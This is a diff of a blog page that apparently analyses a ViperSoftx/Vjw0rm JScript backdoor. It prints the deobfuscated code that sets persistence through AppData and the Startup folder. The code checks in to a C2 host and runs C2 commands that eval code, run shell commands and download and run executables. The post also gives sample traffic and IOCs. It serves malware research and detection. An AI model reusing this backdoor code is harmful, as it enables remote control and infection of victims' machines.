@@ -22,7 +22,7 @@
 <span class="px-4 py-1 hover:text-eureka" name=Auto>Auto</span></div></div></div></div><div class="fixed hidden inset-0 opacity-0 h-full w-full cursor-default z-0" id=is-open-mobile></div></nav><script>let element=document.getElementById("lightDarkMode");storageColorScheme==null||storageColorScheme=="Auto"?document.addEventListener("DOMContentLoaded",()=>{window.matchMedia("(prefers-color-scheme: dark)").addEventListener("change",switchDarkMode)}):storageColorScheme=="Light"?(element.firstElementChild.classList.remove("fa-adjust"),element.firstElementChild.setAttribute("data-icon","sun"),element.firstElementChild.classList.add("fa-sun")):storageColorScheme=="Dark"&&(element.firstElementChild.classList.remove("fa-adjust"),element.firstElementChild.setAttribute("data-icon","moon"),element.firstElementChild.classList.add("fa-moon")),document.addEventListener("DOMContentLoaded",()=>{getcolorscheme(),switchBurger()})</script></div></header><main class="grow pt-16"><div class=pl-scrollbar><div class="mx-auto w-full max-w-screen-xl lg:px-4 xl:px-8"><div class="grid grid-cols-2 gap-4 lg:grid-cols-8 lg:pt-12"><div class="lg:col-start-2 bg-secondary-bg col-span-2 rounded px-6 py-8 lg:col-span-6"><article class=prose><h1 class=mb-4>ViperSoftx Vjw0rm Variant</h1><div class="text-tertiary-text not-prose mt-2 flex flex-row flex-wrap items-center"><div class="me-6 my-2"><i class="fas fa-calendar me-1"></i>
 <span>2020-02-10</span></div><div class="me-6 my-2"><i class="fas fa-clock me-1"></i>
 <span>4 min read</span></div><div class="me-6 my-2"><i class="fas fa-folder me-1"></i>
-<a href=https://c3rb3ru5d3d53c.github.io/categories/malware/ class=hover:text-eureka>malware</a></div></div><p><strong>Situation:</strong></p><p>While watching <a href=https://any.run>Any.Run</a> for interesting scripts to deobfuscate, I noted that its traffic did appear to be like other variants of <code>vjw0rm</code> however wasn&rsquo;t sure of what else it could do.</p><p><strong>Metadata:</strong></p><ul><li>Sample: <code>3236312b9dc691dd8b9214f08ff01e5d</code></li></ul><p><strong>Analysis</strong></p><p>The obfuscation techniques are pretty standard, the first stage deobfuscates base64 data then performs mathematic operations on it (I don&rsquo;t give a crap how they work I just let it do the heavy lifting for me), interestingly the base64 string is reversed.</p><p>After this then the obfuscation consistently used <code>eval</code> which is easily replaced with <code>console.log</code> and ran using <code>nodejs</code> to dump the next stages.</p><p>It took approximatly twenty different times dumping the obfuscated code before I was able to access the deobfuscated code.</p><p>The script starts with setting up some global variables the script needs to run then makes a call to <code>ModinySks()</code>, this function is responsible to establishing persistence.</p><pre><code class=language-js>var shell = new ActiveXObject('WScript.Shell');
+<a href=https://c3rb3ru5d3d53c.github.io/categories/malware/ class=hover:text-eureka>malware</a></div></div><p><strong>Situation:</strong></p><p>While watching <a href=https://any.run>Any.Run</a> for interesting scripts to deobfuscate, I noted that its traffic did appear to be like other variants of <strong>vjw0rm</strong> however wasn&rsquo;t sure of what else it could do.</p><p><strong>Metadata:</strong></p><ul><li>Sample: <strong>3236312b9dc691dd8b9214f08ff01e5d</strong></li></ul><p><strong>Analysis</strong></p><p>The obfuscation techniques are pretty standard, the first stage deobfuscates base64 data then performs mathematic operations on it (I don&rsquo;t give a crap how they work I just let it do the heavy lifting for me), interestingly the base64 string is reversed.</p><p>After this then the obfuscation consistently used <strong>eval</strong> which is easily replaced with <strong>console.log</strong> and ran using <strong>nodejs</strong> to dump the next stages.</p><p>It took approximatly twenty different times dumping the obfuscated code before I was able to access the deobfuscated code.</p><p>The script starts with setting up some global variables the script needs to run then makes a call to <strong>ModinySks()</strong>, this function is responsible to establishing persistence.</p><pre><code class=language-js>var shell = new ActiveXObject('WScript.Shell');
 var fstym = new ActiveXObject('Scripting.FileSystemObject');
 var spl = '|V|';
 var Ch = '\\';
@@ -42,7 +42,7 @@ var batf = AppData + wn + '.bat';
 var vbsf = AppData + wn + '.vbs';
 var lnkf = Startup + wn + '.lnk';
 ModinySks();
-</code></pre><p>We can see that <code>powershell.exe</code> is used to copy, the backdoor script to the <code>%AppData%</code> folder then establishing persistence in the startup folder as a <code>LNK</code> file.</p><pre><code class=language-js>function ModinySks() {
+</code></pre><p>We can see that <strong>powershell.exe</strong> is used to copy, the backdoor script to the <strong>%AppData%</strong> folder then establishing persistence in the startup folder as a <strong>LNK</strong> file.</p><pre><code class=language-js>function ModinySks() {
 	try {
 		shell.Run(ps + &quot; Copy-Item -Path '&quot; + fxDmE4zu + &quot;' -Destination '&quot; + AppData + wn + &quot;'&quot;, 0, false);
 		var newpato = 'start wscript.exe /E:jscript &quot;&quot;&quot;' + AppData + wn + '&quot;&quot;&quot;';
@@ -51,7 +51,7 @@ ModinySks();
 	} catch (err) {
 	}
 }
-</code></pre><p>After persistence is achieved, it will checkin to the C2 server <code>seko[.]vipers[.]pw:8880</code>, send fingerprinting data in the <code>User-Agent</code>.</p><p>Interestingly, this variant adds the <code>X-Header</code> HTTP header with the variant prefix / version as well.</p><pre><code class=language-js>function SendHttp(R) {
+</code></pre><p>After persistence is achieved, it will checkin to the C2 server <strong>seko[.]vipers[.]pw:8880</strong>, send fingerprinting data in the <strong>User-Agent</strong>.</p><p>Interestingly, this variant adds the <strong>X-Header</strong> HTTP header with the variant prefix / version as well.</p><pre><code class=language-js>function SendHttp(R) {
 	var X = new ActiveXObject('Microsoft.XMLHTTP');
 	X.open('put', 'http://seko.vipers.pw:8880/connect', false);
 	var useragent = getUserAgent();
@@ -60,23 +60,23 @@ ModinySks();
 	X.send(R);
 	return X.responsetext;
 }
-</code></pre><p>The C2 server response body will be parsed by use of the delimiter <code>|V|</code> much like previous variants.</p><pre><code class=language-js>var send = SendHttp();
+</code></pre><p>The C2 server response body will be parsed by use of the delimiter <strong>|V|</strong> much like previous variants.</p><pre><code class=language-js>var send = SendHttp();
 var Command = send.split(spl);
 var order = Command[0];
 var order_data = Command[1];
 </code></pre><p><strong>C2 Command (Ex):</strong></p><p>Code:</p><pre><code class=language-js>if (order === 'Ex') {
 	eval(order_data);
 }
-</code></pre><p>Command from C2: <code>Ex|V|&lt;jscript_code></code></p><p><strong>C2 Command (Cmd):</strong></p><p>Code:</p><pre><code class=language-js>if (order === 'Cmd') {
+</code></pre><p>Command from C2: <strong>Ex|V|&lt;jscript_code></strong></p><p><strong>C2 Command (Cmd):</strong></p><p>Code:</p><pre><code class=language-js>if (order === 'Cmd') {
 	shell.Run(order_data, 0, false);
 }
-</code></pre><p>Command from C2: <code>Cmd|V|whoami</code></p><p><strong>C2 Command (DwnlExe):</strong></p><p>Code:</p><pre><code class=language-js>if (order === 'DwnlExe') {
+</code></pre><p>Command from C2: <strong>Cmd|V|whoami</strong></p><p><strong>C2 Command (DwnlExe):</strong></p><p>Code:</p><pre><code class=language-js>if (order === 'DwnlExe') {
 	var path = Temp + Command[2];
 	DownFile(Command[1], path, true);
 	WScript.Sleep(DeLay * 1000);
 	shell.Run(&quot;cmd.exe start '&quot; + path + &quot;'&quot;, 0, false);
 }
-</code></pre><p>Command from C2: <code>DwnlExe|V|&lt;url>|V|&lt;path></code></p><p><strong>C2 Command (DwnlOnly):</strong></p><p>Code:</p><pre><code class=language-js>if (order === 'DwnlOnly') {
+</code></pre><p>Command from C2: <strong>DwnlExe|V|<url>|V|<path></strong></p><p><strong>C2 Command (DwnlOnly):</strong></p><p>Code:</p><pre><code class=language-js>if (order === 'DwnlOnly') {
 	varpathdwn = '';
 	var path = Command[3];
 	var exe = Command[4];
@@ -112,7 +112,7 @@ var order_data = Command[1];
 		WScript.Quit(1);
 	}
 }
-</code></pre><p>Command from C2: <code>UpdateS|V|&lt;url>|V|&lt;tmp_file_name></code></p><p><strong>C2 Checkin Traffic:</strong></p><pre><code class=language-http>PUT /connect HTTP/1.1
+</code></pre><p>Command from C2: <strong>UpdateS|V|<url>|V|&lt;tmp_file_name></strong></p><p><strong>C2 Checkin Traffic:</strong></p><pre><code class=language-http>PUT /connect HTTP/1.1
 Accept: */*
 Accept-Language: en-us
 User-Agent: viperSoftx_1.0.7.6_C4BA3647\USER-PC\Admin\Microsoft Windows 7 Professional [32]\\YES\undefined\
@@ -122,7 +122,7 @@ Host: seko.vipers.pw:8880
 Content-Length: 0
 Connection: Keep-Alive
 Cache-Control: no-cache
-</code></pre><p>If you look closely the difference are the use of the <code>PUT</code> HTTP method and the use of the <code>x-header</code>.</p><p>This is easy enough to create detection for.</p><p><strong>IOCS:</strong></p><pre><code class=language-txt>3236312b9dc691dd8b9214f08ff01e5d
+</code></pre><p>If you look closely the difference are the use of the <strong>PUT</strong> HTTP method and the use of the <strong>x-header</strong>.</p><p>This is easy enough to create detection for.</p><p><strong>IOCS:</strong></p><pre><code class=language-txt>3236312b9dc691dd8b9214f08ff01e5d
 seko.vipers.pw
 </code></pre><p><strong>References:</strong></p><ul><li><a href=/samples/2020-02-10-vipersoftx.zip>Deobfuscated Samples</a></li><li><a href=https://app.any.run/tasks/e97fabaa-96ca-4377-b0ee-2344d1c11291/>Any.Run</a></li><li><a href=https://www.virustotal.com/gui/file/ad5e9d005b764ba80b93c31bec1814ee43ac13143ca67d795a05ae7dbe9cf72f/detection>VirusTotal</a></li></ul></article><div class=my-4><a href=https://c3rb3ru5d3d53c.github.io/tags/vjw0rm/ class="inline-block bg-tertiary-bg text-sm rounded px-3 py-1 my-1 me-2 hover:text-eureka">#vjw0rm</a>
 <a href=https://c3rb3ru5d3d53c.github.io/tags/malware/ class="inline-block bg-tertiary-bg text-sm rounded px-3 py-1 my-1 me-2 hover:text-eureka">#malware</a>
